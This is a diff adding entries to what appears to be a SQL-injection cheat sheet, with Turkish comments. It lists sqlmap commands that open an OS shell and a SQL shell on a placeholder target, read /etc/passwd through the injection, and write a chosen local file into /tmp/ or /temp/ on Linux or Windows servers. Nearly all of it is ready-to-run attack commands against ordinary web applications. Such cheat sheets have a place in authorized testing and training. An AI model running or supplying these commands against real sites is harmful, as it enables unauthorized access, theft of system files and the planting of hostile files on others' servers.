@@ -33,6 +33,13 @@ sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell
 # SQL Shell
 sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell --sql-shell --level 5 --risk 3 
 
+#SQLMAP READ FİLE
+sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell --level 5 --risk 3 --file-read "/etc/passwd" 
+
+#SQLMAP WRİTE FİLE
+For linux : sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell --level 5 --risk 3 --file-write "kaydedilecek olan dosyanın yolu" --file-dest "/tmp/"
+Form windows : sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell --level 5 --risk 3 --file-write "kaydedilecek olan dosyanın yolu" --file-dest "/temp/"
+
 --------------------------------
 
 Manual sql injection commands
